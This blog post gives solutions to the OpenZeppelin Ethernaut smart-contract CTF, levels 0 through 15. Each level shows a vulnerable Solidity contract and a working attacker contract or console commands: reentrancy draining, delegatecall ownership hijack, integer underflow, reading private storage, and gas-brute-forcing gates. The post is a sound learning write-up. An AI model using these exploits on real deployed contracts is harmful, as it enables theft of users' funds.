<!--
date: "2023-12-26"
tags: [ethereum, puzzles]
title: "OpenZeppelin Ethernaut"
summary: "Solutions to OpenZeppelin Ethernaut CTFs."
-->

# Ethernaut

[Ethernaut](https://ethernaut.openzeppelin.com/) is a Solidity-based CTF. Every level is a contract that has an exploit, and we are tasked with finding it & exploiting it. Solving these challenges were how I first started my Web3.0 journey, right after [CryptoZombies](https://cryptozombies.io/). It is a great way to learn about EVM (Ethereum Virtual Machine) and Solidity language.

This post has all the solutions at the time of me solving them, so it is missing the solutions for the latest levels.

For the problems here, I also [have a repo](https://github.com/erhant/ethernaut-evm-challenges) that can solve them on-chain & replicate them locally. Check that out if you want to dive deeper into the code, and get your hands dirty with [Foundry](https://getfoundry.sh/) too.

## 0. [Hello Ethernaut](https://ethernaut.openzeppelin.com/level/0)

Welcome! It is going to be a long but immensely educational road. This level prepares you on how to use the console. Start by typing `help()`. Get comfortable with the commands you see there. You will need some test ether too, so please do visit the faucets linked there and get some ether.

1. To start, click on the big blue button to get a new level instance. This will be your target contract on all puzzles. You will be doing stuff to it, hijacking it's ownership, draining its balance and whatever!

2. The rest of the level starts by calling `contract.info()`. In Chrome v62 (or Brave browser), you can use `await` in the console. That makes things a lot easier; call `await contract.info()`. Note that once you get to `contract.` the console will show you the properties of the contract object, and there are a bunch of functions there!

3. It tells us that we have what we need in `info1()`. So naturally, we will call `await contract.info1()`.

4. We are told to call `info2()` with `"hello"` parameter! We do so with `await contract.info2("hello")`.

5. We are told to check the `infoNum()` property. When we do so with `await contract.infoNum()` we get some weird stuff back in our console. What the hell is this?? Fret not, tis a mere [BigNumber object](https://web3js.readthedocs.io/en/v1.2.11/web3-utils.html#bn). You can convert it to a number or string via `toNumber()` or `toString()`. Once we do so, we see that it denotes the number 42.

```js
{
  negative: 0,
  words: [
    42,
    // empty
  ],
  length: 1,
  red: null
}
```

6. We know what to do already, let's call `await contract.info42()`. We see that we should have called `theMethodName` instead.

7. So we do: `await contract.theMethodName`. Oh, we need to call `method7123949` instead!

8. Once we call `await contract.method7123949()`, we see the following message: "If you know the password, submit it to `authenticate()`". Do we know the password? There certainly seems to be a `password()` function as a property of our `contract` object, so let's call it!

9. After `await contract.password()` we get the password as `ethernaut0`. Submitting this to `await contract.authenticate("ethernaut0")` prompts us to confirm a transaction!

Once that is mined, we seem to have nothing more to do. As the next natural thing to do, we may as well submit our instance (the orange button). Indeed, that is the end of the level! Congratulations, you are now ready for the real deal.

## 1. [Fallback](https://ethernaut.openzeppelin.com/level/1)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
    require(
      msg.sender == owner,
      "caller is not the owner"
    );
    _;
  }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

The receive function is flawed, we just need to send some value via contribute and then via receive to change the owner. The contribute requires less than 0.001 ether, and receive expects greater than 0. Here is the plan:

1. We will contribute 1 Wei.
2. We will then send money to the contract address via a fallback function. This can be done by calling a non-existent function in the contract with some ether value.
3. We are now the owner!
4. To deal the final blow, we call the `withdraw` function. By only spending 2 Wei, we got the owners balance :)

```js
// (1) Contribute
await contract.contribute({ value: "1" });

// (2) Fallback
await contract.sendTransaction({
  from: player,
  value: "1",
  data: undefined, // for the fallback
});

// (3) Confirm ownership
await contract.owner();

// (4) Withdraw
await contract.withdraw();
```

## 2. [Fallout](https://ethernaut.openzeppelin.com/level/2)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallout {

  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;

  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
    require(
      msg.sender == owner,
      "caller is not the owner"
    );
    _;
  }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

Prior to the `constructor` function, the constructor was used as the function that has the same name with the contract. However, if by any chance the supposed constructor function has a different name, you are open to attacks! In this case, the name is `Fallout` but the function is written as `Fal1out`.

This actually happened to [Rubixi](https://github.com/crytic/not-so-smart-contracts/tree/master/wrong_constructor_name). The author initially used DynamicPyramid as the contract name, and therefore the constructor. Later, he only changed the contract name to Rubixi and forgot the DynamicPyramid constructor as is, effectively leaving it up for grabs. Someone did grab eventually.

## 3. [Coinflip](https://ethernaut.openzeppelin.com/level/3)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

In this attack, we will guess the supposed "random" flips by calling the attack from our contracts. The target contract is programmed to flip a coin on each block, so each guess we make must be on different blocks.

We can simply copy and paste their `flip` function in our contract, and then call their actual `flip` function based on the result. Here is our attacking contract with a `psychicFlip` function that always guesses correctly:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/utils/math/SafeMath.sol";

// interface for target
interface CoinFlip {
  function flip(bool _guess) external returns (bool);
}

contract Attacker {
  CoinFlip coinflipTarget;
  using SafeMath for uint256;

  constructor(address _target) {
    coinflipTarget = CoinFlip(_target);
  }

  function psychicFlip() public {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(57896044618658097711785492504343953926634992332820282019728792003956564819968);
    bool side = coinFlip == 1 ? true : false;

    bool result = coinflipTarget.flip(side);
    require(result, "Could not guess, abort mission.");
  }
}
```

That is pretty much it!

## 4. [Telephone](https://ethernaut.openzeppelin.com/level/4)

[Play the level](https://ethernaut.openzeppelin.com/level/0x0b6F6CE4BCfB70525A31454292017F640C10c768)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {
  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

The `tx.origin` is the address that creates the transaction, and `msg.sender` is the sender of the current message. As such, `tx.origin == msg.sender` is **true** if message sender is an ethereum account; or **false** if the message sender is a contract. So, we want `tx.origin != msg.sender` to become the owner of the target, we just need to write a contract and call that function.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Telephone {
  function changeOwner(address _owner) external;
}

contract Attacker {
  Telephone telephoneTarget;

  constructor(address _target) {
    telephoneTarget = Telephone(_target);
  }

  function pwn() public {
    require(msg.sender == tx.origin, "Who is attacking? :D");
    telephoneTarget.changeOwner(tx.origin);
  }
}
```

## 5. [Token](https://ethernaut.openzeppelin.com/level/5)

[Play the level](https://ethernaut.openzeppelin.com/level/0x63bE8347A617476CA461649897238A31835a32CE)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

This attack makes use of the integer overflow or integer underflow exploit. In fact, the statement `require(balances[msg.sender] - _value >= 0);` is completely wrong because the calculation is happening on unsigned integers! Of course, they will always be greater than or equal to 0.

We can't exploit the bug by sending money to ourselves, because the two lines will cancel out:

```solidity
balances[msg.sender] -= _value;
balances[_to] += _value;
```

Instead, we can just send some tokens to zero address `0x0000000000000000000000000000000000000000`. We have 20 tokens, so lets send 21 tokens to the zero address:

```js
await contract.transfer("0x0000000000000000000000000000000000000000", 21);
```

Once this transaction is mined, we are basically rich in whatever this token is (we have 115792089237316195423570985008687907853269984665640564039457584007913129639935 of it to be exact). No need to worry about the burnt 21 tokens back there :)

If you REALLY worry about burning tokens, just create a contract and transfer there instead!

## 6. [Delegation](https://ethernaut.openzeppelin.com/level/6)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {
  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {
  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

The `delegatecall` is an important function. Normally, contracts call functions by making [message calls](https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#message-calls). [`delegatecall`](https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries) is a more specialized call, basically forwarding a contract's context to some other contract and let it do whatever it wants with it. This is useful to implement libraries that might work on your storage variables, or have upgradable contracts where a proxy makes delegate calls to various different contracts over time.

During a `delegatecall`, the following do not change:

- `msg.sender`
- `msg.value`
- `address(this)`
- The storage layout (we will exploit this in this challenge)

I would like refer to this article that explains how delegate calls work really well: <https://eip2535diamonds.substack.com/p/understanding-delegatecall-and-how?s=r>.

The attack in this example is just one transaction:

```js
await sendTransaction({
  from: player,
  to: contract.address,
  data: "0xdd365b8b",
});
```

Now let us look at the `data` part: EVM calls functions by looking at the **first 4 bytes of the function signature**. The function signature is `keccak256` (i.e. `sha3`) of the function prototype. In this case, `web3.utils.sha3('pwn()').slice(2, 2 + 4 * 2)` gives us `dd365b8b`. If there were function parameters, we would give them as 32 bytes for each, but in this case there are no parameters so we only write the function signature as data.

When we call Delegation contract with this, it will go to fallback function. There, a delegatecall is made with `msg.data` as the parameter, so it will call `pwn` function of Delegate.

The actual exploit has to do with storage. Notice that both contracts have `address public owner` at their first slot in storage. When you use `delegatecall`, the caller's storage is active and the callee can update it, with respect to the slots. As we see, `pwn` updates `owner` and this in effect updates the caller's storage value at the same slot, which is again the owner address.

The storage variable assignment within `pwn` therefore effects the contract which made `delegatecall`, and we become the owner.

## 7. [Force](https://ethernaut.openzeppelin.com/level/7)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Force {/*

                   MEOW ?
         /\_/\   /
    ____/ o o \
  /~____  =ø= /
 (______)__m_m)

*/}
```

This contract is supposedly not accepting any payments. Well, it is possible to force money into a contract by `selfdestruct`'ing a contract with some balance, with the target contract address as the parameter.

We deploy the contract below with some small amount of ether, and then call the `pwn` function to let it `selfdestruct` and transfer all of its balance to the target contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attacker {
  function pwn(address _target) payable public {
    selfdestruct(payable(_target));
  }
}
```

That is all about this one!

## 8. [Vault](https://ethernaut.openzeppelin.com/level/8)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Vault {
  bool public locked;
  bytes32 private password;

  constructor(bytes32 _password) public {
    locked = true;
    password = _password;
  }

  function unlock(bytes32 _password) public {
    if (password == _password) {
      locked = false;
    }
  }
}
```

Here we recall the golden rule: everything on the blockchain is there for everyone to see, and it will always be there. As such, we can find out the password that was used in construction of the contract. There are actually two ways to do it:

**Find the password by looking at the contract creation transaction**: The contract creation code is composed of contract ABI encoded and the parameters. Therefore some of the digits we see there at the end are `constructor` arguments. We know that there is only one argument: password (32 bytes). In hexadecimals it is 64 characters, so we can check the final 64 characters of the contract creation code and that is the password. Note that while calling the `unlock` function you should add `0x` at the beginning of the string.

**Find the password by looking at the storage variables**: Looking at the Vault contract, the storage is read from top to bottom. EVM has `2 ^ 256}` slots with a 32-byte value stored in each. At the top, we have `bool public locked` and after that we have `bytes32 private password;`. These variable are at index 0 and 1 in the storage respectively. We can therefore read the password via:

```js
await web3.eth.getStorageAt(contract.address, 1);
```

and simply give the result as the parameter to `contract.unlock(...)`.

## 9. [King](https://ethernaut.openzeppelin.com/level/9)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}
```

The ponzi starts with 0.001 ether. We can exploit the game by giving an greater or equal ether, but via a contract that disallows receiving ether. This way, if someone is eligible to be the new king, the transaction will fail when it tries to send us the prize!

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

contract OneWayForward {

  receive () external payable {
    revert("Im the king!");
  }

  fallback () external payable {
    revert("Im the king!");
  }

  function forward(address payable _to) public payable {
    (bool sent, ) = _to.call{value: msg.value}("");
    require(sent, "forwarded call failed");
  }

}
```

The contract is simple: a forward function forwards our sent money to some address. The recieving address will know the contract as `msg.sender`, however they won't be able to send money back. Preventing to recieving money can be done by **not** implementing `receive` and `fallback` functions. In my case, I wanted to be a little bit cheeky and I implement them but inside revert with "Im the king!" message when they send me money ;)

**A note on Call vs. Transfer**: We used `_to.call{value: msg.value}("")` instead of `_to.transfer(msg.value)`. This is because `transfer` sends 2300 gas to the receiver, but that gas may not always be enough for the code to run on their side; so we must forward all our gas to them with `call`.

## 10. [Reentrancy](https://ethernaut.openzeppelin.com/level/10)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Reentrance {

  using SafeMath for uint256;
  mapping(address => uint) public balances;

  function donate(address _to) public payable {
    balances[_to] = balances[_to].add(msg.value);
  }

  function balanceOf(address _who) public view returns (uint balance) {
    return balances[_who];
  }

  function withdraw(uint _amount) public {
    if(balances[msg.sender] >= _amount) {
      (bool result,) = msg.sender.call{value:_amount}("");
      if(result) {
        _amount;
      }
      balances[msg.sender] -= _amount;
    }
  }

  receive() external payable {}
}
```

There is a pattern called [Checks - Effects - Interactions](https://fravoll.github.io/solidity-patterns/checks_effects_interactions.html) in Solidity.
Basically:

1. you **check** whether you can do something, such as checking balance
2. you apply the **effects** of doing it on your contract, such as updating balance
3. you do the actual **interactions** on-chain with other, such as transferring money

In this case, the function is `withdraw` but the **interaction** comes before the **effect**. This means that when we receive money from within the `withdraw`, things are briefly in our control until the program goes back to the `withdraw` function to do the effect. When we have the control, we can call `withdraw` once more and the same thing will happen again and again.

When we create the instance in this game, we can see that: - `await getBalance(contract.address)` is 0.001 ether. - `await contract.balanceOf(player)` is 0.

We will donate some money to create our initial balance at the target, which will allow the `balances[msg.sender] >= _amount` to be true. Now, we can repeadetly withdraw that amount by re-entering the withdraw function. Since balance update effect happens after the transfer interaction, we will go on and on until the balance is depleted.As a defense, you could use a pull-payment approach: the user to be paid must come and withdraw their money themselves, rather than us paying to them.

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

// Interface of the target contract
interface IReentrance {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external;
}

contract Attacker {
  address public owner;
  IReentrance targetContract;
  uint targetValue = 0.001 ether;

  constructor(address payable _targetAddr) payable {
    targetContract = IReentrance(_targetAddr);
    owner = msg.sender;
  }

  // withdraw money from this contract
  function withdraw() public {
    require(msg.sender == owner, "Only the owner can withdraw.");
    (bool sent, ) = msg.sender.call{value: address(this).balance}("");
    require(sent, "Failed to withdraw.");
  }

  // begin attack by depositing and withdrawing
  function attack() public payable {
    require(msg.value >= targetValue);
    targetContract.donate{value:msg.value}(address(this));
    targetContract.withdraw(msg.value);
    targetValue = msg.value;
  }

  receive() external payable {
    uint targetBalance = address(targetContract).balance;
    if (targetBalance >= targetValue) {
      // withdraw at most your balance at a time
      targetContract.withdraw(targetValue);
    } else if (targetBalance > 0) {
      // withdraw the remaining balance in the contract
      targetContract.withdraw(targetBalance);
    }
  }
}
```

This is how "The DAO" hack was executed, which resulted in the creation of Ethereum Classic; pretty mind-blowing to think just the misplacement of two lines caused a million-dollar hack!

## 11. [Elevator](https://ethernaut.openzeppelin.com/level/11)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Building {
  function isLastFloor(uint) external returns (bool);
}

contract Elevator {
  bool public top;
  uint public floor;

  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}
```

In this level, we will write the `Builder` contract which the elevator interacts with. However, in the same transaction we will return opposite boolean results for `isLastFloor` function.

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

interface Elevator {
  function goTo(uint _floor) external;
}

contract Building {
  bool toggleMe = true;

  function isLastFloor(uint) external returns (bool) {
    toggleMe = !toggleMe;
    return toggleMe;
  }

  function callElevator(address _elevator) public {
    Elevator(_elevator).goTo(1);
  }

}
```

The problem here is that Elevator did not specify `isLastFloor` to be a `view` function, which would prevent us from modifying the state like this. Another attack approach would be to return different results depending on the input data _without_ modifying state, such as via `gasLeft()`.

## 12. [Privacy](https://ethernaut.openzeppelin.com/level/12)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Privacy {
  bool public locked = true;
  uint256 public ID = block.timestamp;
  uint8 private flattening = 10;
  uint8 private denomination = 255;
  uint16 private awkwardness = uint16(now);
  bytes32[3] private data;

  constructor(bytes32[3] memory _data) public {
    data = _data;
  }

  function unlock(bytes16 _key) public {
    require(_key == bytes16(data[2]));
    locked = false;
  }

  /*
    A bunch of super advanced solidity algorithms...

      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
  */
}
```

This is similar to the 8th level [Vault](./8-Vault.md), where we read the EVM storage. Here in addition to that, we learn about a [small optimization of EVM](https://docs.soliditylang.org/en/v0.8.13/internals/layout_in_storage.html) and [how casting works](https://www.tutorialspoint.com/solidity/solidity_conversions.htm).

EVM stores state variables in chunks of 32 bytes. If consecutive variables make up a 32-byte space (such as in this case 8 + 8 + 16 = 32) they are stored in the same chunk. If you were to write them elsewhere, this optimization may not have happened. Let us check the results of `await web3.eth.getStorageAt(contract.address, i)` for the following values of `i`:

- `0: 0x0000000000000000000000000000000000000000000000000000000000000001`
  This is the `bool public locked = true` which is stored as 1.
- `1: 0x0000000000000000000000000000000000000000000000000000000062bc6f36`
  This is the `uint256 public ID = block.timestamp` which is the UNIX timestamp in hex, `62bc6f36` (of this [block](https://rinkeby.etherscan.io/block/10937345) in my [instance](https://rinkeby.etherscan.io/address/0x99181B0E39A3b17fc44f99972bF3E6Afd6296a07)])
- `2: 0x000000000000000000000000000000000000000000000000000000006f36ff0a`
  This is the 32 byte chunk of 3 variables all captures in `6f36ff0a`:
  - `uint8 private flattening = 10` which is `0a`
  - `uint8 private denomination = 255` which is `ff`
  - `uint16 private awkwardness = uint16(now)` which is `6f36`.
    Well, that `awkwardness` variable is just the `block.timestamp` casted to 16-bits. We already know the actual 256-bit (32-byte) value of timestamp above: `62bc6f36`. When casted down 16-bits, it became `6f36` (4 x 4-bit hexadecimals).
- `3: 0x0ec18718027136372f96fb04400e05bac5ba7feda24823118503bff40bc5eb55`
  This is `data[0]`.
- `4: 0x61a99635e6d4b7233a35f3d0d5d8fadf2981d424110e8bca127d64958d1e68c0`
  This is `data[1]`.
- `5: 0x46b7d5d54e84dc3ac47f57bea2ca5f79c04dadf65d3a0f3581dcad259f9480cf`
  This is `data[2]`.

Now we just need `data[2]` casted down to `bytes16`. Here is how casting works in very few words:

- Conversion to smaller type costs more signficant bits. (e.g. `uint32 -> uint16`)
- Conversion to higher type adds padding bits to the left. (e.g. `uint16 -> uint32`)
- Conversion to smaller byte costs less significant bits. (e.g. `bytes32 -> bytes16`)
- Conversion to larger byte add padding bits to the right. (e.g. `bytes16 -> bytes32`)

So, when we cast down `data[2]` we will get the left-half of it: `'0x46b7d5d54e84dc3ac47f57bea2ca5f79c04dadf65d3a0f3581dcad259f9480cf'.slice(0, 2 + 32)` and then `await contract.unlock('0x46b7d5d54e84dc3ac47f57bea2ca5f79')`. That is all! Here is a good article on reading storage: <https://medium.com/@dariusdev/how-to-read-ethereum-contract-storage-44252c8af925>.

## 13. [Gatekeeper One](https://ethernaut.openzeppelin.com/level/13)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract GatekeeperOne {
  using SafeMath for uint256;
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    require(gasleft().mod(8191) == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
    require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
    require(uint32(uint64(_gateKey)) == uint16(tx.origin), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

Wow this was challenging! We must pass 3 obstacles (gates) that are implemented as modifiers:

1. Simple `msg.sender != tx.origin`.
2. A cute `gasLeft().mod(8191) == 0`.
3. A series of `require`'s telling us what the gate key must look like.

### Gate 1

Solution to the first gate is trivial, just use a contract as a middleman. From previous puzzles we have learned that `msg.sender` is the immediate sender of a transaction, which may be a contract; however, `tx.origin` is the originator of the transaction which is usually you.

### Gate 2

Here we need to adjust the gas used in the transaction. We can do this by specifying the gas to be forwarded similar to how we specify ether value: `foo{gas: ...}()`. To find the proper gas amount is the tricky part, because we don't know exactly how much gas we will have by then. Here is what we can do: we will find a good approximate gas value, and then brutely try a range of values around it. The steps to do that is as follows:

```solidity
  function enterOnce(uint _gas) public {
    bytes memory callbytes = abi.encodeWithSignature(("enter(bytes8)"),key);
    (bool success, ) = target.call{gas: _gas}(callbytes);
    require(success, "failed my boy.");
  }
```

1. Copy paste the contract in Remix, and try to enter the gate (assuming that gate 1 is passing at this point). I wrote a small utility for this in my attacker contract, shown above.

2. Unless you are extremely lucky, the transaction will be rejected by this gate. That is ok, because we want to debug it!

3. Debug the transaction in Remix to get to the [`GAS`](https://github.com/crytic/evm-opcodes) opcode, which is what `gasleft()` is doing in the background. There, we will look at the `remaining gas` field in "Step Details". You can easily get there in several ways:
   1. Clicking "Click _here_ to jump where the call reverted." and then going backward a bit until you find the opcode.
   2. Putting a breakpoint to the line with `gasleft()` and clicking right arrow at the debugger, which will go very close to that opcode.
   3. Another cool way is to actually get inside the SafeMath libraries modulus function, and then look at the local variables in the debugger. One of them will be 8191, the other will be the gas in question.

4. In my case, I had forwarded 10000 gas and right at the `GAS` opcode I had 9748 left. That means I used 252 gas to get there. If I start with 8191 \* k + 252 gas for some large enough "k" to meet the overall gas requirement, I should be okay! The thing is, gas usage can change with respect to the compiler version, but in the puzzle we see that `^0.6.0` is used above, so we will do all the steps above with that version.

5. I set the gas candidate as 8191 \* 5 + 252 = 41207 with a margin of 32. Then I let it loose on the gate keeper!

```solidity
  function enter(uint _gas, uint _margin) public {
    bytes memory callbytes = abi.encodeWithSignature(("enter(bytes8)"),key);
    bool success;
    for (uint g = _gas - _margin; g <= _gas + _margin; g++) {
      (success, ) = target.call{gas: g}(callbytes);
      if (success) {
        correctGas = g; // for curiosity
        break;
      }
    }
    require(success, "failed again my boy.");
  }
```

It was successful, and I also kept record of the correct gas amount which turned out to be 41209.

### Gate 3

We are using an 8-byte key, so suppose the key is `ABCD` where each letter is 2 bytes (16 bits).

1. `CD == D` so `C`: must be all zeros.
2. `CD != ABCD` so `AB` must **not** be all zeros.
3. `CD == uint16(tx.origin)`: `C` is already zeros, and now we know that `D` will be the last 16-bits of `tx.origin`.

So, my `uint16(tx.origin)` is `C274`; and I will just set `AB = 0x 0000 0001` to get `_gateKey = 0x 0000 0001 0000 C274`. Alternatively, you can use bitwise masking by bitwise-and'ing (`&`) your `tx.origin` with `0x FFFF FFFF 0000 FFFF`.

That is all folks :)

## 14. [Gatekeeper Two](https://ethernaut.openzeppelin.com/level/14)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract GatekeeperTwo {
  address public entrant;

  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  modifier gateTwo() {
    uint x;
    assembly { x := extcodesize(caller()) }
    require(x == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}
```

Here is another gate puzzle to pass! Again we have three gates:

1. Simple `msg.sender != tx.origin`.
2. A cute `extcodesize` call via inline assembly.
3. A series of `require`'s tells us what the gate key must be like.

### Gate 1

Similar to previous puzzles, just use a contract as a middleman.

### Gate 2

Here is the actual gate:

```solidity
modifier gateTwo() {
  uint x;
  assembly { x := extcodesize(caller()) }
  require(x == 0);
  _;
}
```

The `extcodesize` basically returns the size of the code in the given address, which is caller for this case. Contracts have code, and user accounts do not. To have 0 code size, you must be an account; but wait, how will we pass the first gate if that is the case? Here is the trick of this gate: `extcodesize` returns 0 if it is being called in the `constructor`! Here is a [link](https://ethereum.stackexchange.com/a/15642) to where I stumbled upon this info.

In short, we have to execute our attack from within the constructor.

### Gate 3

This gate has the following form:

```solidity
modifier gateThree(bytes8 _gateKey) {
  require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == uint64(0) - 1);
  _;
}
```

It is just an XOR operation (often denoted with ⊕), and there is really only one parameter we can control here: the gate key. Well, how do we find it? XOR has the property that if the same value XORs itself they cancel out; furthermore, XOR is commutative so `a ⊕ b = b ⊕ a`. Starting with `a ⊕ b = c`, if we XOR both sides with `a` we get `a ⊕ a ⊕ b = c ⊕ a`, and the left side cancels out to give `b = c ⊕ a`.

One more thing: `(uint64(0) - 1)` causes is not really good for Solidity, and even caused gas estimation errors for me! The result is basically the maximum possible value of `uint64`, and we have a cool way to find it via `type(uint64).max`.

We can safely find the gate key as:

```solidity
bytes8 key = bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
```

That is all for this one!

## 15. [Naught Coin](https://ethernaut.openzeppelin.com/level/15)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/token/ERC20/ERC20.sol';

 contract NaughtCoin is ERC20 {

  // string public constant name = 'NaughtCoin';
  // string public constant symbol = '0x0';
  // uint public constant decimals = 18;
  uint public timeLock = now + 10 * 365 days;
  uint256 public INITIAL_SUPPLY;
  address public player;

  constructor(address _player)
  ERC20('NaughtCoin', '0x0')
  public {
    player = _player;
    INITIAL_SUPPLY = 1000000 * (10**uint256(decimals()));
    // _totalSupply = INITIAL_SUPPLY;
    // _balances[player] = INITIAL_SUPPLY;
    _mint(player, INITIAL_SUPPLY);
    emit Transfer(address(0), player, INITIAL_SUPPLY);
  }

  function transfer(address _to, uint256 _value) override public lockTokens returns(bool) {
    super.transfer(_to, _value);
  }

  // Prevent the initial owner from transferring tokens until the timelock has passed
  modifier lockTokens() {
    if (msg.sender == player) {
      require(now > timeLock);
      _;
    } else {
     _;
    }
  }
}
```

Here we have a simple ERC-20 contract in our hands, that prevents us to `transfer` money to someone. However, this does not prevent us to `approve` that someone, and let them call `transferFrom` to take our money. That is precisely what we are going to do. We create and deploy a simple contract:

```solidity
// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol";

contract NaughtWithdraw {
  function withdrawFrom(address _tokenAddr, address _from, uint _amount) public {
    bool success = IERC20(_tokenAddr).transferFrom(_from, address(this), _amount);
    require(success, "failed!");
  }
}
```

